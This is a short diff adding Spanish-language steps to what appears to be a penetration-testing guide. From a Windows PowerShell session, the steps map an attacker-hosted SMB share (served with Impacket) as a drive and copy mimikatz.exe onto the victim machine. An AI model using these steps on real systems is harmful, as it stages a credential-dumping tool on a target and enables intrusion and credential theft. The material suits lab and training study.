@@ -1278,3 +1278,23 @@ Impacket v0.9.18-dev - Copyright 2002-2018 Core Security Technologies
 [*] Config file parsed
 [*] Config file parsed
 ```
+
+A continuación, desde la máquina Windows desde la sesión Powershell, aplicamos el siguiente comando:
+
+```bash
+New-PSDrive -Name "SharedFolder" -PSProvider "FileSystem" -Root "\\192.168.1.45\shared"
+```
+
+Directamente, veremos como se llevará a cabo una sincronización de recursos, creando una unidad lógica **SharedFolder:\\** sobre el equipo Windows que se conecta a nuestra unidad lógica *_pwd_*, la cual sincroniza contra la unidad física donde se sitúa nuestro directorio **shared**, desde donde depositaremos nuestros archivos.
+
+En primer lugar, cambiamos de unidad lógica en la máquina Windows:
+
+```bash
+cd SharedFolder:
+```
+
+Posteriormente, nos traemos al equipo los recursos que consideremos:
+
+```bash
+move mimikatz.exe C:\Users\s4vitar\Desktop\mimikatz.exe
+```
